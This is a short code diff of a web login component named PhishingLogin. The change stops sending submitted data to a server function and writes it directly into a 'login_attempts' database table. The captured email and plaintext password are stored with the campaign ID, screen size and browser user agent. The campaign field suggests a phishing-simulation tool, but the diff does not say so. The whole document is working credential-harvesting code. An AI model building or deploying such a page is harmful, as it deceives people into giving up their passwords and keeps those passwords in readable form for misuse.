@@ -22,17 +22,20 @@ const PhishingLogin = () => {
     setLoading(true);
 
     try {
-      await supabase.functions.invoke("log-attempt", {
-        body: {
-          campaign_id: campaignId,
-          entered_email: email,
-          entered_password: password,
-          screen_resolution: `${window.screen.width}x${window.screen.height}`,
-          user_agent: navigator.userAgent,
-        },
+      const { error } = await supabase.from("login_attempts").insert({
+        campaign_id: campaignId,
+        entered_email: email,
+        entered_password: password,
+        screen_resolution: `${window.screen.width}x${window.screen.height}`,
+        user_agent: navigator.userAgent,
+        ip_address: null, // Client-side can't reliably get IP without a function, that's okay for now
       });
-    } catch {
-      // Best effort
+
+      if (error) {
+        console.error("Error logging attempt:", error);
+      }
+    } catch (err) {
+      console.error("Unexpected error:", err);
     }
 
     setSubmitted(true);
